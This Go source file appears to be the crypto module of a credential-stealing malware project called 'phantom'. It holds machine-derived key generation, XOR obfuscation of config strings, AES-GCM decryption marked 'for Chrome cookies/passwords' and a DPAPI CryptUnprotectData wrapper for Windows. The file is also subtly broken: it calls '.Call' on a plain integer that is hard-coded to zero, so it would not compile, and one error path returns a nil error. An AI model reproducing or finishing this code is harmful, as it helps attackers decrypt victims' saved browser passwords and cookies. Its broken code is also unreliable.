package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"os"
	"phantom/config"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
)

// derives encryption key from machine-specific values
func DeriveKey() []byte {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	seed := hostname + username + "phantom_salt_7f3a"

	key := pbkdf2.Key([]byte(seed), []byte("phantom"), 4096, 32, sha256.New)
	config.SetKey(key)
	return key
}

// XOR encrypt/decrypt
func XOR(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// decrypt config string
func DecryptConfig(encrypted string) string {
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	key := config.GetKey()
	if len(key) == 0 {
		DeriveKey()
		key = config.GetKey()
	}
	return string(XOR(data, key))
}

// encrypt config string
func EncryptConfig(plain string) string {
	key := config.GetKey()
	if len(key) == 0 {
		DeriveKey()
		key = config.GetKey()
	}
	encrypted := XOR([]byte(plain), key)
	return base64.StdEncoding.EncodeToString(encrypted)
}

// AES-GCM decrypt (for Chrome cookies/passwords)
func AESGCMDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, err
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// DPAPI decrypt (Windows)
func DPAPIDecrypt(data []byte) ([]byte, error) {
	return dpapi(data)
}

// dpapi wrapper - calls CryptUnprotectData
func dpapi(data []byte) ([]byte, error) {
	type dataBlob struct {
		cbData uint32
		pbData *byte
	}

	procDecrypt := getCryptUnprotectData()
	if procDecrypt == 0 {
		return nil, nil
	}

	var outBlob dataBlob
	inBlob := dataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, _ := procDecrypt.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, nil
	}

	output := make([]byte, outBlob.cbData)
	copy(output, unsafe.Slice(outBlob.pbData, outBlob.cbData))

	return output, nil
}

func getCryptUnprotectData() uintptr {
	return 0 // resolved dynamically in syscalls package
}
